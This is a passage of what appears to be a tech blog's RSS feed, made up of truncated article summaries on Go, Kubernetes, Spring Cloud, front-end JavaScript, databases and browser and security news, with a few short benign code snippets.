      <description>A pointer is an address value that points to the start of an area of memory. So you need to have a good knowledge of computer composition principles. Generally speaking, it is important to maintain a deep memory of what is told in this course and then accumulate it day by day to really reach an understanding.
The concept of a pointer in a high-level language is not fundamentally different from a pointer on a low-level interface.</description>

      <description>Can a normal element become a replacement element By replacement elements, we usually mean elements such as images, videos, etc., corresponding to HTML tags &amp;lt;img&amp;gt; and &amp;lt;video&amp;gt;, while elements such as &amp;lt;div&amp;gt;, &amp;lt;p&amp;gt;, &amp;lt;span&amp;gt;, etc., which are normally used for layout, are non-replacement elements.

As I gained experience, I gradually learned a lot of similar points that I was excited about, and the Unsafe technique was definitely one of them.</description>

      <description>Kubernetes Ingress is just a common resource object in Kubernetes that requires a corresponding Ingress Controller to resolve Ingress rules and expose the service to the outside, such as ingress-nginx, which is essentially just an Nginx Pod that then redirects requests to This Pod itself is also exposed through the Kubernetes service, most commonly through LoadBalancer.
Again, this article wants to give you a simple and clear overview of what&amp;rsquo;s behind Kubernetes Ingress to make it easier for you to understand the Ingress in use.</description>

      <description>We all know that Pods in a StatefulSet have separate DNS records. For example, if a StatefulSet is named etcd and its associated Headless SVC is named etcd-headless, CoreDNS will resolve an A record for each of its Pods as follows.
 etcd-0.etcd-headless.default.svc.cluster.local etcd-1.etcd-headless.default.svc.cluster.local &amp;hellip;&amp;hellip;  So can other Pods besides the one managed by StatefulSet also generate DNS records?
As shown below, we only have a Headless SVC here, not a Pod managed by StatefulSet, but a Pod managed by ReplicaSet, and we can see that it seems to generate resolution records similar to those in StatefulSet.</description>

ByteBuffer has two main implementation classes
 HeapByteBuffer In-heap memory DirectByteBuffer Off-heap memory  In my personal experience, I tend to use DirectByteBuffer in most cases, both for read and write operations, mainly because HeapByteBuffer may have some unexpected internal operations when interacting with FileChannel, which is the caveat mentioned in the title of this article, so let&amp;rsquo;s sell it here.</description>

      <description>Visitor Pattern The accessor pattern is a behavioral pattern that allows arbitrary detached visitors to be able to access managed elements under the control of the manager. The visitor cannot change the definition of the object (but this is not mandatory, you can agree to allow changes). For the manager, it does not care how many visitors there actually are, it only cares about a defined order of access to the elements (for example, for a binary tree, you can provide multiple access orders such as mid-order, pre-order, etc.</description>

      <description>Strategy Pattern Route planning for two points on a map is a typical strategy mode application scenario. When we do a start to finish route planning, we expect the map to give us the best route for these modes: walking. Public transit, driving. Sometimes it may be subdivided into several strategies such as transit (rail priority), bus (transfer priority), etc.
Standard work Following our construction convention, here is a framework code for path planning</description>

      <description>Since FastDFS distributed file storage does not retain the original file name when uploading files, when the file is uploaded it returns a file ID in the following format, which contains the group the file is in, the secondary directory, and a base64-encoded file name generated from the client&amp;rsquo;s IP, timestamp, and file size. The file ID is stored in the client database and can only be accessed by the</description>

This is difficult for us to accept.
In this article, we will describe the strategies of some common log collection tools for handling multi-line logs.</description>

When a third-party library method needs to be defined separately, and the library does not export the method&amp;rsquo;s input type, you need to get the method&amp;rsquo;s input type.
For example, there is the following example function, we want to get its parameter type and return value type, so how should we implement it.

      <description>There are special requirements that require the use of syntax that is prohibited in strict mode and results in an error, so avoid building the result with use strict.
Compile the build without adding use strict babel-loader set strictMode=false babel-loader handles module transformations via @babel/helper-module-transforms, which provides a configuration parameter strictMode to specify whether to compile to strict mode, which defaults to true, i.e. use strict is added by default. This is shown in the figure below.</description>

      <description>When analyzing problems with Electron applications, relevant system operation information is sometimes essential, so naturally there is a need for system base information collection and operation performance monitoring. The native capabilities in Electron are based on Node.js, so most of the system data collection for Electron applications is based on the capabilities provided by Node.js. In Node.js applications, various system-related information can be obtained mainly through the process and os</description>

      <description>Compared to React 16, the new features of React17 are featureless, so the upgrade from 16 to 17 is relatively smooth. One disruptive change, however, is the change in the event system. In React 17, React will no longer attach event handlers at the document level. Instead, it will attach them to the root DOM container into which your React tree is rendered. Exceptions are thrown wherever document.addEventListener is used</description>

In the Windows 11 Insider Preview Build 22000.194 changelog, Microsoft clarified the requirements for running Windows 11 on a virtual machine, stating that the system requirements for Windows 11 on a virtual machine (VM) will be the same as a physical PC, and that VMs previously created to run the Insider Preview version will not be updated to the latest preview version.</description>

      <description>The sort method of std accepts two iterators, begin and end, and abstracts access to the elements through the iterators, hiding the internal implementation.
This is a simple example:
1 2 3 4 5 6 7 8 9  std::list&amp;lt;int&amp;gt; list { 0, 4, 2, 1, 3, }; std::sort(list.begin(), list.end());   The result is that the list is sorted, and we don&amp;rsquo;t need to care about what sorting algorithm is used.</description>

      <description>Someone recommended this article before, Complexity has to live somewhere, the general idea is that the complexity of the system can&amp;rsquo;t just disappear, it can only be transferred from one place to another, because there is so much logic in the real world, there are so many cases around the corner that you have to deal with, which will inevitably introduce complexity into the system.
Although these complexities you can transfer to your colleagues or outsource to third-party systems, the complexity is indefinite.</description>

      <description>There are three ways to register Qt types for multithreading, namely inheriting QThread, using QObject&amp;rsquo;s moveToThread function and Qtconcurrent concurrent threads. In many articles, it is recommended to inherit from the QThread class and override the run method to use time-consuming manipulation code in run. This approach makes us think that QThread is the entity of the thread. Creating a QThread object is thought of as opening a new thread.</description>

Mozilla&amp;rsquo;s development of Firefox Tab Unloading began more than 10 years ago, but Mozilla has never enabled the feature in any of the browser&amp;rsquo;s previous releases. Tab Unloading was stalled two years ago due to detection of low memory errors.
Tab unloading is now a feature in Firefox Nightly for Windows, which is currently in version 93 and is expected to be released in Firefox 93 for Windows later this year.</description>

      <description>The goal is to implement a realistic HTTP HTTPS proxy server, and there are currently two ways to implement a proxy
Plain Proxy : This proxy plays the role of a middleman, for the client it is the server, for the server it is the client, it is responsible for passing HTTP messages back and forth in the middle
Tunnel Proxy : It is a proxy that is done through the HTTP body, which is a TCP-based application layer proxy that uses the CONNECT method of HTTP to establish a connection.</description>

      <description>Tensorflow is a Python based machine learning and artificial intelligence project developed by Google. Recently TensorFlow has dropped support for YAML in order to fix a critical code execution vulnerability.
AML or YAML Ain&amp;rsquo;t Markup Language is a human-readable data serialization language used to pass objects and store data between processes and applications, and many Python applications use YAML to serialize and deserialize objects.
The CVE ID for this vulnerability is CVE-2021-37678, and the maintainers of TensorFlow and Keras, a wrapper project for TensorFlow, say that the vulnerability stems from an insecure parsing of YAML, which could allow an attacker to execute arbitrary code when an application deserializes a Keras model served in YAML format.</description>

&amp;ldquo;99% of LiveCode&amp;rsquo;s work is done by our internal team. But a large part of the community is using the open source version for free, and our current maintenance costs are unbalanced against the rewards. It&amp;rsquo;s a huge task and one we don&amp;rsquo;t have the resources to take on. Therefore, we have decided to stop supporting the open source version of LiveCode at this time.</description>

      <description>I am temporarily unemployed, so this article does not represent the views of any employer.
By 2021, most companies have decided to embrace cloud-native, but many programmers&amp;rsquo; understanding of cloud-native is limited to &amp;ldquo;native k8s-based applications&amp;rdquo;. If a company goes to the cloud (k8s), it&amp;rsquo;s embracing cloud-native. Those with a little more understanding think that if we go to service mesh in addition to k8s, we are embracing cloud-native.
The cncf&amp;rsquo;s definition of cloud-native is in fact very complex.</description>

Since then, developers have been working to address these missing elements in Qt6, and with the upcoming Qt 6.</description>

In the article, the official says that the previous homepage had a number of problems, such as no obvious call-to-action phrase at the top of the site, too much text explaining concepts, a lack of focus due to the visual weight between sections of the site, and not enough code examples. Finally, an A/B test was carried out with users of the site to see if any new users liked the homepage, but the results were essentially 50/50.</description>

      <description>You can use generics in Go 1.17. The current master branch, by default, already supports generics, so you don&amp;rsquo;t need to add the -G=3 parameter.
You can try the latest branch of go by following these steps:
1 2  go get golang.org/dl/gotip gotip download   Just use the gotip command instead of go when compiling your code.
With the release of Go 1.17, there have been a lot of articles on Go generics, but they are basically brief introductory articles.</description>

      <description>A lawsuit that has been going on for nearly 20 years and was thought to threaten the very existence of Linux has finally come to an end.
The lawsuit began in 2003, but the events behind it date back to 1998. At the time, IBM and Santa Cruz Operation (SCO - the vendor of UNIX for x86 CPU devices) joined forces with other companies to create the &amp;ldquo;Monterey&amp;rdquo; project to create a version of UNIX that would run on multiple hardware platforms - this was what the Linux community was doing at the time.</description>

The x86 calling convention is, in a nutshell, the language&amp;rsquo;s convention for passing parameters between functions. The caller knows what parameters to pass to the called function in what form and in what order, and the called function follows this convention to find the contents of the passed</description>

      <description>Deno&amp;rsquo;s compatibility data can now be found in the compatibility chart on MDN. The official blog notes that Deno embraces modern Web APIs, and they believe that when features are added to runtime, it is best to do so in the form of Web APIs. This is both good for developers, who are already familiar with these APIs, and good for Deno, who can leverage existing tests.
The Web API has a huge amount of documentation, and a search for &amp;ldquo;fetch javascript&amp;rdquo; yields hundreds of millions of results.</description>

Google&amp;rsquo;s employees came out to start a business, the company name is also TailScale (seems to be doing vpn&amp;rsquo;s), PlanetScale (this seems to be taking vitess out to start a business) so that means ex-googler is also more like the culture of this company.</description>

      <description>Review the old and know the new Traditionally, file uploads on the web are done using a file type form input box.
1  &amp;lt;input type=&amp;#34;file&amp;#34;&amp;gt;   We can specify the type of file to be selected with the accept property, the directory property specifies whether a folder can be selected, and the capture property specifies the front or rear camera.
It&amp;rsquo;s still very powerful.
But the file input box has the fatal disadvantage that the UI is too ugly and not customizable.</description>

Fixing the security issue should have been a good thing, but unfortunately this security patch introduced a new and more serious vulnerability (CVE-2021-38604).
Siddhesh Poyarekar, a Red Hat software engineer, said that if an attacker wanted to exploit the initial security vulnerability to launch a minimal attack, he would need many prerequisites before he could exploit the vulnerability to crash the program.</description>

In the latter case, the tabs are stacked together and inevitably closed by mistake, and the user may need to reopen it.
All browsers on the market today have an &amp;ldquo;undo&amp;rdquo; option to restore closed tabs, which is only available in regular browsing windows, not in incognito or private browsing windows.</description>

      <description>For multi-branch codebases, it is a common requirement to move code from one branch to another.
There are two scenarios for this. In one case, you need all the code changes in another branch, so you use git merge. In the other case, you only need some of the code changes (a few commits), then you can use Cherry pick.
Basic usage What the git cherry-pick command does is apply the specified commit to other branches.</description>

The performance requirements for games are so high that some large games struggle to run even on a PC, let alone in the sandbox model of a browser! However, despite the difficulties, many developers have never given up and want to make browsers run 3D games.
In 2012, Alon Zakai, an engineer at Mozilla, was working on the LLVM compiler and had the idea that many 3D games are written in C/C++, so if we could compile C/C++ into JavaScript code, they would run in the browser.</description>

      <description>On August 10, local time, artificial intelligence research company OpenAI announced that its AI encoder Codex has been upgraded and launched internal testing. The biggest highlight of Codex is understood to be its ability to translate English directly into code.
In the Codex Demo, OpenAI shows how the software can build simple websites and basic games using natural language, and how it can flexibly translate between different programming languages and even handle data science queries.</description>

      <description>In response to the cloud service provider, Elastic recently made changes to the official Python client for its Elasticsearch database (Elasticsearch-py) to make it incompatible with the forks, and then brutally shut down comments on the topic on GitHub. This action caused a heated discussion among developers.

      <description>When it comes to front-end performance optimization, we usually think of enabling compression to compress the resource file size. Or enabling browser caching can have the effect of optimizing resource loading speed with fewer HTTP requests, but these means mainly improve the loading speed when repeatedly accessing the same resources. By default, the browser will only load resources declared in HTML first. If it is not declared, the browser will not load the resource earlier.</description>

      <description>WireGuard author Jason Donenfeld recently announced the WireGuardNT project, a native port of WireGuard for the Windows kernel. Like the other versions, WireGuardNT, lowercase &amp;ldquo;wireguard-nt&amp;rdquo;, started out as a port of the Linux version of the codebase. After a successful initial porting effort, the NT codebase quickly diverged to better fit the native NTisms and NDIS (Windows Network Stack) APIs, and the end result was a deeply integrated and high-performance WireGuard implementation for the NT kernel that leverages the full functionality of the NT kernel and NDIS.</description>

Although the current version number is still in double digits, according to the official upgrade roadmap, Mozilla will release Firefox Nightly 100 in March next year. Mozilla has launched an experiment to change the Firefox browser&amp;rsquo;s user agent to the three-digit &amp;ldquo;Firefox/100.0&amp;rdquo; version in order to test whether any websites will load abnormally due to the user agent problem when Firefox version number is updated to 100 in the future.</description>

      <description>Whether it&amp;rsquo;s Edge, Brave, Vivaldi in foreign countries, or 360 or QQ in China, these third-party browsers all use the Chromium engine. Mozilla&amp;rsquo;s Firefox is one of the few well-known browsers that is not based on Chromium.
As long as users have some observation of others around them, they will find that more and more users have switched to Chromium-based browsers instead of Firefox.
Recently, Firefox published its public data report since 2018, and the official report is a further confirmation of users&amp;rsquo; observations.</description>

      <description>Microsoft and Google are working on a new API for Chromium-based browsers like Chrome and Edge called &amp;ldquo;VirtualKeyboard&amp;rdquo; that updates the on-screen keyboard for typing on Windows, macOS, Chrome OS and Android and provides better control.
According to the documentation, Virtual Keyboard (VK) is a public JavaScript API that puts control of the on-screen keyboard in the hands of Web developers. As it stands now, developers have very limited control over VK, and the keyboard&amp;rsquo;s performance is not ideal for scenarios where developers want users to use a website&amp;rsquo;s built-in keyboard to enter passwords on Android.</description>

As mentioned above, Fuchsia OS currently already includes a Chromium-based browser, but for now it&amp;rsquo;s very small and has few additional features and only simple web browsing. Despite the support of the Chromium project, there has been no indication that Chrome will make its way to Fuchsia OS.</description>

      <description>JavaScript is single-threaded and asynchronous operations are particularly important.
Whenever you use functions outside the engine, you need to interact with the outside world, thus creating asynchronous operations. Because there are so many asynchronous operations, JavaScript has to provide a lot of asynchronous syntax. It&amp;rsquo;s like, some people get hit all the time, and they have to become very resilient, or they&amp;rsquo;re screwed.
Node&amp;rsquo;s asynchronous syntax is more complex than the browser&amp;rsquo;s, because it talks to the kernel and has to make a special library, libuv, to do this.</description>

      <description>Microsoft Edge vulnerability research lead Johnathan Norman revealed that the team is experimenting with a new feature in Edge that disables the JavaScript JIT compiler to enable some additional security protection. They also gave the experiment an interesting and slightly provocative name, &amp;ldquo;Super Duper Secure Mode (SDSM)&amp;rdquo;.
According to Norman, JIT compilation is a &amp;ldquo;very complex process that few people understand, with very small errors. But while JIT improves browser performance, it also introduces vulnerabilities, and &amp;ldquo;performance and complexity usually come at a cost, which we usually bear in the form of security vulnerabilities and subsequent patches.</description>

      <description>The standard library provides std::env::args() to get command line arguments, the first value is the name of the program, similar to the way arguments are obtained in other languages:
1 2 3 4 5  letargs: Vec&amp;lt;String&amp;gt;=env::args().collect();letquery=&amp;amp;args[1];letfilename=&amp;amp;args[2];println!(&amp;#34;Searching for {}&amp;#34;,query);println!(&amp;#34;In file {}&amp;#34;,filename);  But in the process of product development, we need more program parameters, and need certain rules and checks, this time we need to use some other libraries to parse these parameters, such as the structopt library.</description>

      <description>Redis 6.0 has been released more than a year ago.
The new features in Redis 6.0 have been identified through step-by-step discussions and optimizations.
Many of these features have already been introduced in previous releases such as RC.
However, there are some new changes in the official GA release:
 SSL ACL: better, command support RESP3 Client side caching: redesigned Threaded I/O Diskless replication on replicas Cluster support in Redis-benchmark and improved redis-cli cluster support Disque in beta as a module of Redis: starting to invade the message queue space Redis Cluster Proxy Support for immediate deletion when the RDB is no longer in use, for scenarios where the disk is not dropped PSYNC2: Optimized replication protocol More friendly timeout setting support Faster RDB loading, 20% ~ 30% improvement STRALGO, new string command, currently only one implementation of LCS (longest common subsequence)  @antirez mentioned that it was only the largest version update in Redis history, so it was prudent to recommend more testing and evaluation of the product in the application, and promised to release version 6.</description>

      <description>SurfaceView is a special kind of view in Android. The biggest difference between it and TextView and Button is that it is not on the same view layer as its view container, and its UI display can be done in a separate thread, so the drawing of SurfaceView does not affect the main thread. surfaceView does not affect the main thread. Combining these features, SurfaceView is generally used to implement dynamic or complex images and animations.</description>

      <guid>https://www.sobyte.net/post/2021-07/web-worker-tutorial/</guid>
      <description>1. Overview The JavaScript language uses a single-threaded model, which means that all tasks can only be done on one thread, one thing at a time. If the previous task is not done, the later task has to wait. With the increase in computing power of computers, especially with the advent of multi-core CPUs, single-threading poses a great inconvenience and cannot fully utilize the computing power of computers.
The role of the Web Worker is to create a multi-threaded environment for JavaScript, allowing the main thread to create Worker threads and assign some tasks to the latter to run.</description>

      <description>The MySQL master-slave architecture has been widely used, and the stability of the master-slave replication relationship is a constant concern.
MySQL 5.6 provides a new feature for master-slave replication stability: slave support crash-safe. This feature can solve the problem of relay_log.info bit inaccuracy caused by abnormal power failure in previous versions.
In this article, we will introduce this feature in terms of principle, parameters, and new issues.

Like the stack data structure, a queue is a linear table with restricted operations. The end that performs the insert operation is called the tail and the end that performs the delete operation is called the header.</description>

      <description>Starting with React 16.3, React deprecated some APIs (componentWillMount, componentWillReceiveProps, and componentWillUpdate) and introduced some new ones instead, including getDerivedStateFromProps. getDerivedStateFromProps. Depending on the application scenario, getDerivedStateFromProps is used in different ways.
Semi-controlled components Although React officially does not recommend semi-controlled components, and certainly not from the perspective of API design and maintenance. However, in practice, users often don&amp;rsquo;t care about the internal implementation of a business logic, but want to have full control over some internal state when needed, so semi-controlled components are a good choice.</description>

With reflect, we can achieve the ability to get object types, object fields, object methods, get tag information of struct, dynamically create objects, whether objects implement specific interfaces, convert objects, get and set object values, call Select branches dynamically, etc.</description>

1. Synchronization AJAX The common practice of sending data back to the server is to put the collected user data inside the unload event and send it back to the server with an AJAX request.
However, asynchronous AJAX inside the unload event may not always work, because the page is already in unload and the browser may or may not send it.</description>

      <description>Handling time is always a headache, no matter what time it is. The time format is too diverse, and it is even more difficult to deal with time zones, daylight saving time, leap seconds and other minor details. Therefore, we usually use standard libraries or time libraries provided by third parties to handle time in our programs. The dateparse we are going to introduce today focuses on a very small area of time processing - parsing strings in date time format.</description>

      <description>Recently, I was working on the refactoring of the old system, and I needed to introduce a gateway service into the new system after the refactoring was completed, as an adaptation and proxy for the interface between the new system and the old system. Previously, many gateway applications used the Spring-Cloud-Netfilx solution based on the Zuul1.x version, but given that Zuul1.x had stopped iterating, it used a more traditional blocking</description>

      <description>The scope of GlobalFilter is all the routing configuration, we can do additional extensions by customizing GlobalFilter, which can be used to implement some global functions.
How to customize GlobalFilter The interface definition for org.springframework.cloud.gateway.filter.GlobalFilter is as follows.
1 2 3 4  public interface GlobalFilter { Mono&amp;lt;Void&amp;gt; filter(ServerWebExchange exchange, GatewayFilterChain chain); }   We just need to implement the org.springframework.cloud.gateway.filter.GlobalFilter interface and register the implementation class in Spring&amp;rsquo;s container, the official example is as follows.</description>

SpringMVC&amp;rsquo;s request parameter binding mechanism Users who know the history of Feign will know that Feign itself is a Netflix product, Spring Cloud Feign is based on the native Feign encapsulation, the introduction of a large number of SpringMVC annotation support, making it easier to use by the majority of Spring users, but also produced a not small confusing effect.</description>

Request degradation processing is still relatively mainstream is Netfilx produced Hystrix. Hystrix works on the</description>

 X.X: For the case where the major version number (major) is 0, it implies that your current API is still in an unstable state, and the new minor version may not be backward compatible. X.X: the current API is in a stable state, the increase of minor only means the increase of new feature, the API is still backward compatible X.</description>

      <description>I recently came across a small knowledge point during development. Here is a Base64 encoded image that I want to copy into the system pasteboard, how can I solve this?
For example, here is a picture.
I can convert to Base64 encoding by using the Base64 conversion tool at https://www.base64-image.de/ and the result is as follows.
An image is something like data:image/png;base64,ivBor2&amp;hellip; Such encoding.
Q: Now I have an image in this format, how can I copy it into the system pasteboard?</description>

      <description>Spring provides the ApplicationContext event mechanism to publish and listen to events, which is a very useful feature. Spring has some built-in events and listeners, such as before the Spring container starts, after the Spring container starts, after the application fails to start, etc. The listeners on these events will respond accordingly. Of course, we can also customize our listeners to listen to Spring&amp;rsquo;s original events. Or we can customize</description>

      <description>Last year Ian Lance Taylor and Robert Griesemer released a new draft of Go generics (The Next Step for Generics), and the response from Gopher at home and abroad was overwhelming, with everyone interpreting the draft and this article, and feeling that this version of Go generic design is basically close to Go&amp;rsquo;s generic goals, and in short, much better than the previous one.
Ian also provided an online compilation tool, go2go, to get a taste of Go generic programming.</description>

      <description>The scope of GatewayFilter is the specified routing configuration, and the routing configuration options require filters to specify the list of GatewayFilters that you want to use. We can customize the GatewayFilter to do additional extensions to achieve some functionality that does not exist in the built-in GatewayFilter and apply it to our routing configuration.
How to customize GatewayFilter To customize GatewayFilter, you need to implement the org.springframework.cloud.gateway.filter.factory.GatewayFilterFactory interface, and the definition of GatewayFilterFactory is as follows.</description>

      <description>fetch() is an upgraded version of XMLHttpRequest used to make HTTP requests inside JavaScript scripts.
The browser provides this object natively. This article describes its usage in detail.
1. Basic usage The function of fetch() is basically the same as XMLHttpRequest, but with three main differences.
 fetch() uses Promise and does not use a callback function, so it is much simpler to write and more concise. The modular design of fetch(), with API spread over multiple objects (Response object, Request object, Headers object), is more reasonable; in contrast, the API design of XMLHttpRequest is not very good, with input, output and state all managed in the same interface, making it easy to write very confusing code.</description>

Before writing this article, I did a little survey with my friends asking them about their knowledge of the Spring Boot Actuator and the results were surprisingly consistent, everyone knows that Spring Boot provides automatic configuration of the spring-boot-starter-actuator, but very few people but few people actually use its related features.</description>

      <description>Back in 2015, the keynote at the SpringOne 2015 conference in Washington was Cloud Native Enterprise. The slogan of that conference was also Cloud Native and the posters were all over the place with Cloud Native.
You may wonder how you could call it Cloud Native when containers weren&amp;rsquo;t popular at that time. Although many people may not have the same understanding of Cloud Native, more and more people believe that &amp;ldquo;Cloud native is about culture, not containers&amp;rdquo;.</description>

      <description>This article mainly analyzes the usage of Introspector. Introspector is a tool class that deals specifically with JavaBean and is used to get the descriptors in JavaBean. The commonly used descriptor-related classes of JavaBean are BeanInfo, PropertyDescriptor, MethodDescriptor, BeanDescriptor, EventSetDescriptor and ParameterDescriptor. The following will slowly analyze how these classes are used, as well as some of the features of Introspector.
What is JavaBean JavaBean is a special (actually, it&amp;rsquo;s okay to say ordinary, it&amp;rsquo;s not very special) class, mainly used to pass data information, the methods in this class are mainly used to access private fields, and the method names conform to some naming rules (fields are private, each field has Setter and Getter methods, methods and fields named to meet the first letter lower case hump naming ).</description>

      <description>In large applications, it is a common design pattern to configure master-slave databases and use read-write separation. In Spring applications, to implement read-write separation, it is best to not make changes to existing code, but to support it transparently at the bottom.
Spring has a built-in AbstractRoutingDataSource that can configure multiple data sources into a Map and then, depending on the key, return different data sources. Because AbstractRoutingDataSource is also a DataSource interface, the application can set the key first, and the code that accesses the database can get the corresponding real data source from AbstractRoutingDataSource to access the specified database.</description>

PostgreSQL json development history. postgreSQL has supported json data type since 9.2, but due to the poor performance of parsing json data, it is not favored by everyone, but choose to use nosql database instead. So from pg9.4 onwards, the jsonb data type was supported. Compared to the json type, jsonb does not need to be parsed every time it is used, so the performance is much improved, and it also supports index queries and so on.</description>

It can synchronize files between the local computer and a remote computer, or between two local directories (but does not support synchronization between two remote computers). It can also be used as a file copying tool, replacing the cp and mv commands.
The r in its name refers to remote, rsync actually means &amp;ldquo;remote synchronization&amp;rdquo;. Unlike other file transfer tools (such as FTP or scp), rsync&amp;rsquo;s main feature is that it checks the existing files of both the sender and the receiver and only transfers the parts that have changed (the default rule is that the file size or modification time has changed).</description>

      <description>1 Does an empty structure take up space? In Go, we can use unsafe.Sizeof to calculate the number of bytes an instance of a data type needs to occupy.
1 2 3 4 5 6 7 8 9 10  package main import ( &amp;#34;fmt&amp;#34; &amp;#34;unsafe&amp;#34; ) func main() { fmt.Println(unsafe.Sizeof(struct{}{})) }   Running the above example will output:
1 2  $ go run main.go 0   That is, an instance of the empty struct struct{} does not occupy any memory space.</description>

      <description>The dart language used by Flutter has a garbage collection mechanism, and with garbage collection, memory leaks are inevitable. There is a memory leak detection tool LeakCanary on the Android platform that can easily detect if the current page is leaking in a debug environment. This article will take you through the implementation of a flutter-ready LeakCanary and tell you how I used it to detect two leaks on the 1.</description>

      <description>go module is the official version management tool introduced after Go 1.11, and since Go 1.13, go module has been the default dependency management tool for the Go language. Since Go 1.14, the go modules feature has been officially recommended for use in production environments.
Here is a detailed description of how to use the go module to import local packages.
Prerequisites Suppose we now have two packages, moduledemo and mypackage, where the moduledemo package will import the mypackage package and use its New method.</description>

      <description>Go compiles programs that are perfect for deployment, and if no other libraries are referenced through CGO, we generally compile executable binaries that are single files, perfect for copying and deployment. In practice, in addition to binaries, you may also need some configuration files, or static files, such as html templates, static images, CSS, javascript, etc. How these files can also be typed into the binary would be fantastic, and we could just copy and follow the single executable.</description>

      <description>I recently encountered a problem, that is, how to implement two-way binding prop in Vue.js is better.
Previously I was passing the prop to the child component, and then the child component directly changed the prop directly, this can reflect the result to the parent component, but it is not a good solution.
For example, I often encounter this Warning.
 Avoid mutating a prop directly since the value will be overwritten…</description>

      <description>Goroutine 1 2 3  for { go func() {}() }   The threshold for using Goroutine is really low, and there are a lot of abuses.
Goroutine Leak The causes of Goroutine leaks are usually:
 Read/write operations such as channel/mutex are being performed inside Goroutine, but due to logic problems, they are blocked all the time in some cases. The business logic within the Goroutine enters a dead loop and resources are never released.</description>

      <title>Const in Golang</title>

      <description>Constants are arguably present in every code file, and there are many benefits to using them.
 Avoid magic literals, i.e. numbers, strings, etc. that appear directly in the code. It is not possible to read the code and see what it means at a glance. It also avoids the inconsistencies that can occur when using literals. When their values need to be modified, constants only need to be modified in one place, while literals need to be modified in multiple places, making it easy to miss inconsistencies.</description>

      <description>When inserting a lot of data at once, using bulk inserts can significantly improve performance.
JDBC batch execute When using JDBC, you can use Statement#addBatch(String sql) or PreparedStatement#addBatch method to add SQL statements to the batch list, and then execute them in batch with the executeBatch method. When inserting a lot of data at once, using bulk inserts can significantly improve performance.
reWriteBatchedInserts=true The PostgreSQL JDBC driver supports the reWriteBatchedInserts=true join parameter to modify multiple insert/update statements into a single statement, for example: insert into test(name) values (&#39;n&#39;); insert into test(name) values (&#39;m&#39;); is modified to insert into test(name) values (&#39;n&#39;), (&#39;m&#39;); .</description>

      <description>Exception handling is very important in front-end, including client-side and server-side exceptions. Previously, exception handling was to add err handling for each asynchronous function, which not only increased the workload, but also easily missed some exceptions. Fortunately, Angular6 provides ErrorHandler to handle exceptions (Ionic4 for IonicErrorHandler), the default ErrorHandler handling exceptions is to output it on the console, which obviously can not meet the demand, so you need to implement</description>

      <description>Colleague&amp;rsquo;s feedback React Native project startup reported an error indicating version mismatch, the error screenshot is as follows.
After some troubleshooting, we finally found that the old version of js file was packed locally, and the project itself depends on a different version, so we can delete the old version of the local file.
We can find out that RN has a version check at startup through this error, how is the specific mechanism, let&amp;rsquo;s follow the source code together.</description>

      <description>1, Introduction Browsers allow JavaScript scripts to read and write to the clipboard to automatically copy or paste content.
In general, scripts should not alter the user&amp;rsquo;s clipboard in a way that does not meet the user&amp;rsquo;s expectations. However, there are times when this is convenient, such as the &amp;ldquo;one-click copy&amp;rdquo; feature, where the user clicks a button and the specified content automatically goes to the clipboard.
Currently, there are three ways to implement clipboard operations.</description>

      <description>Redis stores key-value pairs, where the keys are strings and the values are of various types, such as string, list, hash, set, sorted set, and so on. When setting a key-value pair, we should also set the expiration time for it, which can be set by expire and pexpire commands, or by setnx command. So, after setting the expiration time, how exactly do you delete the expired key-value pairs? To find out, let&amp;rsquo;s take a look at Redis&amp;rsquo; expired key deletion policy.</description>

      <description>There are two types of channels in Go language, a channel without cache and a buffer with cache, both of which we are familiar with.
Why am I suddenly talking about this infinite cache channel? The main reason is that I was recently reviewing a colleague&amp;rsquo;s code and I had a problem with a certain design idea that would have been solved by using an infinite cache channel.
 A dispatcher contains a channel, which holds the URLs to be processed A bunch of workers read tasks from the channel, download and parse the page, extract the links, and put the links into the dispatcher.</description>
